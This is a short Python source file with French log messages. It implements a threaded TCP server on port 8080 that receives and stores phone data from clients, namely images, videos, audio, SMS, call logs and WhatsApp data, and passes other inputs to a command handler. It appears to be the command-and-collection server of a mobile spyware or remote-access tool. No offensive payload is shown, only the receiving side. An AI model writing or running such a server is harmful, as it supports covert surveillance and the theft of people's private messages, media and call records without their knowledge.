import socket
import threading
import os
from utils import receive_data, save_file, handle_client_command

SERVER_IP = '0.0.0.0'
SERVER_PORT = 8080
BUFFER_SIZE = 4096
DATA_DIR = 'data'

if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

def handle_client(conn, addr):
    print(f"[+] Connexion de {addr}")
    try:
        while True:
            data_type = receive_data(conn)
            if not data_type:
                print("[-] Connexion perdue.")
                break

            print(f"[>] Type de données reçu : {data_type}")

            if data_type in ["image", "video", "audio", "sms", "call_logs", "whatsapp"]:
                save_file(conn, data_type, DATA_DIR)
            else:
                handle_client_command(conn, data_type)
    except Exception as e:
        print(f"[!] Erreur avec le client {addr} : {e}")
    finally:
        conn.close()
        print(f"[-] Déconnecté de {addr}")

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((SERVER_IP, SERVER_PORT))
        server.listen(5)
        print(f"[+] Serveur en écoute sur {SERVER_IP}:{SERVER_PORT}")
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            thread.start()

if __name__ == "__main__":
    start_server()
